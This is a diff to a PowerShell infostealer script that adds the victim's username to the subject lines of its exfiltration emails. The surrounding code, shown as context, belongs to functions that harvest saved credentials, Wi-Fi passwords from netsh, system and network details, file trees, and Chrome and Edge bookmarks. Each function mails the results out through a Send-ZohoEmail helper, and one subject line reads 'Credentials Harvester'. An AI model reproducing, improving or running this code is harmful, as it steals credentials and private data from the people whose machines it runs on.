@@ -129,7 +129,7 @@ function RunWBPV {
         # SEND to EMAIL or WEBHOOK
         if (-not $isEmailSent) {
              # Email parameters
-             $subject = "Credentials Harvester - Sent on $currentDateTime"
+             $subject = "$env:USERNAME: Credentials Harvester - Sent on $currentDateTime"
              $attachments = @("$env:TEMP\data.txt")  # Array of attachment file paths
              Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
         }    
@@ -204,7 +204,7 @@ function GetWifiPasswords {
 
     # Email file
     if (-not $isEmailsent) {
-        $subject = "Netsh Profiles - Sent on $currentDateTime"
+        $subject = "$env:USERNAME: Netsh Profiles - Sent on $currentDateTime"
         $attachments = @("$env:TEMP\Wifi.txt")  # Array of attachment file paths
         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
     }
@@ -256,7 +256,7 @@ function GatherSystemInfo {
     Get-NetIPAddress | Out-File -FilePath "$sysInfoDir\network_config.txt"
 
     if (-not $isEmailsent) {
-        $subject = "System Info - Sent on $currentDateTime"
+        $subject = "$env:USERNAME: System Info - Sent on $currentDateTime"
         $attachments = @("$sysInfoDir\computer_info.txt","$sysInfoDir\process_list.txt","$sysInfoDir\service_list.txt","$sysInfoDir\network_config.txt")  # Array of attachment file paths
         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
     }
@@ -287,7 +287,7 @@ function ShowTree {
     # SEND to EMAIL or WEBHOOK
     if (-not $isEmailSent) {
         # Email parameters
-        $subject = "Tree Show - Sent on $currentDateTime"
+        $subject = "$env:USERNAME: Tree Show - Sent on $currentDateTime"
         $attachments = @("$env:TEMP\tree.txt")  # Array of attachment file paths
         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
     } 
@@ -314,7 +314,7 @@ function GetBookmarks {
             # SEND to EMAIL or WEBHOOK
             if (-not $isEmailSent) {
                 # Email parameters
-                $subject = "Chrome Bookmarks - Sent on $currentDateTime"
+                $subject = "$env:USERNAME: Chrome Bookmarks - Sent on $currentDateTime"
                 $attachments = @("$env:TEMP\chrome_bookmarks.txt")  # Array of attachment file paths
                 Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
             } 
@@ -339,7 +339,7 @@ function GetBookmarks {
             # SEND to EMAIL or WEBHOOK
             if (-not $isEmailSent) {
                 # Email parameters
-                $subject = "Edge Bookmarks - Sent on $currentDateTime"
+                $subject = "$env:USERNAME: Edge Bookmarks - Sent on $currentDateTime"
                 $attachments = @("$env:TEMP\edge_bookmarks.txt")  # Array of attachment file paths
                 Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
             } 
@@ -352,7 +352,7 @@ function ClearCache {
     #email log file
     if (-not $isEmailSent) {
         # Email parameters
-        $subject = "Logs - Sent on $currentDateTime"
+        $subject = "$env:USERNAME: Logs - Sent on $currentDateTime"
         $attachments = @("$env:TEMP\example-logs.txt")  # Array of attachment file paths
         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
     } 
